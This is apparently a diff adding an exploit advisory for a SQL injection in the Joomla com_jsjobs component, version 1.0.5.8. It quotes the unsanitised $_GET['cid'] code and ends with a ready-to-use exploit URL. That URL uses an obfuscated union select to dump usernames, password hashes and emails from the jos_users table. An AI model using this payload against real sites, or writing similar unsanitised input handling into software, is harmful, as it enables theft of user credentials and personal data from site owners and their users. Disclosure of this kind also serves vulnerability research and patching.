@@ -1,0 +1,38 @@
+# Exploit Title:	Joomla Component com_jsjobs SQL Injection Vulnerability
+
+#Date:			31/05/10 
+
+#Author:		http://www.joomsky.com
+
+#Software Link:		http://www.joomsky.com/index.php?option=com_rokdownloads&view=file&task=download&id=23%3Ajs-jobs&Itemid=4
+
+#Version:		1.0.5.8
+
+#Tested on:		Linux ubuntu32 2.6.32-22-generic x64
+
+#Summary:
+
+On administrator/components/com_jsjobs/views/application/view.html.php file we can find this segment code on line 53:
+
+if ($cur_layout == 'categories'){							
+			if (isset($_GET['cid'][0])) 	$c_id= $_GET['cid'][0];	//o0ps..possible SQL Injection }:)		
+			else $c_id='';	
+			
+			if ($c_id == ''){
+				$cids = JRequest :: getVar('cid', array (0), 'post', 'array');
+				$c_id= $cids[0];				
+			}
+
+		...	//conditional check some values with elseifs...
+}
+
+This check 
+	if (isset($_GET['cid'][0])) 	$c_id= $_GET['cid'][0];
+open SQLi posibilities for get sense information from servers databases. Some like this:
+
+[+]EXPLOIT:
+http://localhost/joomla/administrator/index.php?option=com_jsjobs&task=edit&cid[]=-69/*!union/**/select/**/1,2,3,group_concat%28username,0x3a,password,0x3a,email%29/**/from/**/jos_users*/--
+
+
+by r0i  by r0i  by r0i  by r0i  by r0i  by r0i  by r0i  by r0i  by r0i  by r0i  by r0i  by r0i 
+
